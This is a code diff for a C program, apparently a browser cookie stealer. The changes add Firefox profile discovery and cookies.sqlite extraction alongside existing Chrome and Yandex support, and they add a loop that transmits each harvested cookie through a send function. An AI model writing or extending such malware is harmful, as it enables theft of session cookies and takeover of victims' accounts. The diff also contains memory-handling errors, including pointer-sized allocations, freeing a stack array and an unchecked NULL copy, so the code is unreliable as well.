@@ -26,7 +26,7 @@
 
 /* Global cookies array and it's offset for callback.
 */
-uint32_t offset = 0;
+uint32_t          offset = 0;
 cookies_datatype* local_container;
 
 
@@ -73,9 +73,19 @@ int main(void)
     /* Just in case. */
     for (int i = 0; i < offset; i++)
     {
-        printf("[%d] host: %s, value: %s\n", i,
+        printf("[%d] host: %s, value: %s\n",
+            i,
             local_container[i].host,
             local_container[i].value);
+    }
+
+    int status;
+    for (int i = 0; i < offset; i++)
+    {
+        status = send_single_cookie(local_container[i]);
+        printf("%d\n", status);
+        if (!status)
+            break;
     }
 
     return 0;
@@ -109,7 +119,7 @@ void dir_reader(const char* directory, char** files)
 */
 uint8_t check_file_in_dir(char* filename, const char* dir)
 {
-    char* files[50];
+    char* files[256];
     dir_reader(dir, files);
 
     if (files[0] == NULL)
@@ -124,6 +134,42 @@ uint8_t check_file_in_dir(char* filename, const char* dir)
 
     free(files);
     return 0;
+}
+
+
+/* This function will get full Firefox cookie db file,
+   bacause there are different directories with random names.
+*/
+char* get_ff_cookies_path(char* curr_path)
+{
+    char*   files[24];
+    char*   full_path;
+    uint8_t found;
+
+    dir_reader(curr_path, files);
+    full_path = (char *)malloc(sizeof(curr_path) * 2);
+
+    if (files[0] == NULL)
+    {
+        free(full_path);
+        return NULL;
+    }
+
+    for (int i = 0; files[i]; i++)
+    {
+        strcpy(full_path, curr_path);
+        strcat(full_path, files[i]);
+
+        found = check_file_in_dir("cookies.sqlite", full_path);
+        if (found)
+        {
+            strcat(full_path, "\\cookies.sqlite");
+            return full_path;
+        }
+    }
+
+    free(full_path);
+    return NULL;
 }
 
 
@@ -147,10 +193,15 @@ browser_prediction check_browsers(char* local, char* roaming)
 void collect_data(browser_prediction status)
 {
     char* u_path    = status.user_path;
-    char* full_path = malloc(sizeof(u_path) + sizeof(YA_PATH) + 1);
+    char* full_path = (char *)malloc(sizeof(u_path) + sizeof(YA_PATH) + 1);
+    char* ff_path   = (char *)malloc((sizeof(u_path) + sizeof(FF_PATH)) * 3);
 
-    //if (status.FF)
-        //get_sql(full_path, CH_TYPE);
+    if (status.FF)
+    {
+        sprintf(full_path, "%s%s", u_path, FF_PATH);
+        strcpy(ff_path, get_ff_cookies_path(full_path));
+        get_sql(ff_path, FF_TYPE);
+    }
 
     if (status.CH)
     {
@@ -171,6 +222,7 @@ void collect_data(browser_prediction status)
     }
 
     free(full_path);
+    free(ff_path);
 }
 
 
@@ -180,15 +232,15 @@ static int callback(uint8_t bt, int argc, char **argv, char **colname)
 {
     for (int i = 0; i < argc; i++)
     {
-        if ( !(strcmp(colname[i], "host_key")) )
+        if (!(strcmp(colname[i], "host_key")) || !(strcmp(colname[i], "host")))
             strcpy(local_container[offset].host, argv[i]);
 
-        else if ( !(strcmp(colname[i], "encrypted_value")) )
+        else if (!(strcmp(colname[i], "encrypted_value")) || !(strcmp(colname[i], "value")))
             strcpy(local_container[offset].value, argv[i]);
     }
 
     local_container[offset].b_type = bt;
-    local_container = realloc(local_container, sizeof(*local_container) * (offset+2));
+    local_container = realloc(local_container, sizeof(*local_container) * (offset + 2));
 
     offset++;
     return 0;
